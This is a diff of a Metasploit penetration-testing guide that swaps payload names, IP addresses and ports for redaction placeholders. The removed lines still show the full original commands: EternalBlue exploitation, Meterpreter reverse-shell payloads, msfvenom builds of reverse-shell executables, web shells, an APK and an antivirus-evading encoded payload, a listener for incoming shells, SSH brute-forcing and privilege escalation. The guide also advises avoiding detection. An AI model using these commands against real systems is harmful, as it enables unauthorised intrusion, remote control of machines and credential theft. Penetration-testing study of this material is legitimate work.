@@ -87,7 +87,7 @@ msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
 # 2. Payload Modules - Code executed after exploitation
 msf6 > show payloads
-msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set PAYLOAD windows/x64/meterpreter/[REDACTED_PAYLOAD]
 
 # 3. Auxiliary Modules - Scanning, fuzzing, enumeration
 msf6 > show auxiliary
@@ -147,7 +147,7 @@ msf6 > use exploit/windows/smb/ms17_010_eternalblue
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 # Set target host
-msf6 exploit(...) > set RHOSTS 192.168.1.100
+msf6 exploit(...) > set RHOSTS [REDACTED_RHOST_IP]
 
 # Set target port (if different from default)
 msf6 exploit(...) > set RPORT 445
@@ -156,11 +156,11 @@ msf6 exploit(...) > set RPORT 445
 msf6 exploit(...) > show payloads
 
 # Set payload
-msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/[REDACTED_PAYLOAD]
 
 # Set local host for reverse connection
-msf6 exploit(...) > set LHOST 192.168.1.50
-msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > set LHOST [REDACTED_LHOST_IP]
+msf6 exploit(...) > set LPORT [REDACTED_PORT]
 
 # View all options again to verify
 msf6 exploit(...) > show options
@@ -180,12 +180,12 @@ Select appropriate payload for the situation:
 
 ```bash
 # Singles - Self-contained, no staging
-windows/shell_reverse_tcp
-linux/x86/shell_bind_tcp
+windows/shell_[REDACTED_PAYLOAD]
+linux/x86/shell_[REDACTED_PAYLOAD]
 
 # Stagers - Small payload that downloads larger stage
-windows/meterpreter/reverse_tcp
-linux/x86/meterpreter/bind_tcp
+windows/meterpreter/[REDACTED_PAYLOAD]
+linux/x86/meterpreter/[REDACTED_PAYLOAD]
 
 # Stages - Downloaded by stager, provides full functionality
 # Meterpreter, VNC, shell
@@ -193,11 +193,11 @@ linux/x86/meterpreter/bind_tcp
 # Payload naming convention:
 # [platform]/[architecture]/[payload_type]/[connection_type]
 # Examples:
-windows/x64/meterpreter/reverse_tcp
-linux/x86/shell/bind_tcp
-php/meterpreter/reverse_tcp
-java/meterpreter/reverse_https
-android/meterpreter/reverse_tcp
+windows/x64/meterpreter/[REDACTED_PAYLOAD]
+linux/x86/shell/[REDACTED_PAYLOAD]
+php/meterpreter/[REDACTED_PAYLOAD]
+java/meterpreter/[REDACTED_PAYLOAD]
+android/meterpreter/[REDACTED_PAYLOAD]
 ```
 
 ### Phase 6: Meterpreter Session
@@ -229,7 +229,7 @@ meterpreter > kill [PID]
 meterpreter > ipconfig
 meterpreter > netstat
 meterpreter > route
-meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1
+meterpreter > portfwd add -l [REDACTED_PORT] -p 80 -r [REDACTED_TARGET_IP]
 
 # Privilege Escalation
 meterpreter > getsystem
@@ -264,33 +264,33 @@ Use auxiliary modules for reconnaissance:
 ```bash
 # SMB Version Scanner
 msf6 > use auxiliary/scanner/smb/smb_version
-msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS [REDACTED_RHOST_SUBNET]
 msf6 auxiliary(...) > run
 
 # Port Scanner
 msf6 > use auxiliary/scanner/portscan/tcp
-msf6 auxiliary(...) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > set RHOSTS [REDACTED_RHOST_IP]
 msf6 auxiliary(...) > set PORTS 1-1000
 msf6 auxiliary(...) > run
 
 # SSH Version Scanner
 msf6 > use auxiliary/scanner/ssh/ssh_version
-msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(...) > set RHOSTS [REDACTED_RHOST_SUBNET]
 msf6 auxiliary(...) > run
 
 # FTP Anonymous Login
 msf6 > use auxiliary/scanner/ftp/anonymous
-msf6 auxiliary(...) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > set RHOSTS [REDACTED_RHOST_IP]
 msf6 auxiliary(...) > run
 
 # HTTP Directory Scanner
 msf6 > use auxiliary/scanner/http/dir_scanner
-msf6 auxiliary(...) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > set RHOSTS [REDACTED_RHOST_IP]
 msf6 auxiliary(...) > run
 
 # Brute Force Modules
 msf6 > use auxiliary/scanner/ssh/ssh_login
-msf6 auxiliary(...) > set RHOSTS 192.168.1.100
+msf6 auxiliary(...) > set RHOSTS [REDACTED_RHOST_IP]
 msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
 msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
 msf6 auxiliary(...) > run
@@ -343,31 +343,31 @@ Create standalone payloads:
 
 ```bash
 # Basic Windows reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f exe -o shell.exe
 
 # Linux reverse shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x86/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f elf -o shell.elf
 
 # PHP reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+msfvenom -p php/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f raw -o shell.php
 
 # Python reverse shell
-msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+msfvenom -p python/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f raw -o shell.py
 
 # PowerShell payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
+msfvenom -p windows/x64/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f psh -o shell.ps1
 
 # ASP web shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+msfvenom -p windows/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f asp -o shell.asp
 
 # WAR file (Tomcat)
-msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
+msfvenom -p java/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -f war -o shell.war
 
 # Android APK
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
+msfvenom -p android/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -o shell.apk
 
 # Encoded payload (evade AV)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
+msfvenom -p windows/meterpreter/[REDACTED_PAYLOAD] LHOST=[REDACTED_LHOST_IP] LPORT=[REDACTED_PORT] -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
 
 # List available formats
 msfvenom --list formats
@@ -383,9 +383,9 @@ Configure listener for incoming connections:
 ```bash
 # Manual handler setup
 msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.1.50
-msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/[REDACTED_PAYLOAD]
+msf6 exploit(multi/handler) > set LHOST [REDACTED_LHOST_IP]
+msf6 exploit(multi/handler) > set LPORT [REDACTED_PORT]
 msf6 exploit(multi/handler) > exploit -j
 
 # The -j flag runs as background job
@@ -469,7 +469,7 @@ exploit/multi/http/jenkins_script_console
 - Not all exploits work on all target versions
 
 ### Operational Security
-- Use encrypted channels (reverse_https) when possible
+- Use encrypted channels ([REDACTED_PAYLOAD]) when possible
 - Clean up artifacts after testing
 - Avoid detection by monitoring systems
 - Limit post-exploitation to agreed scope
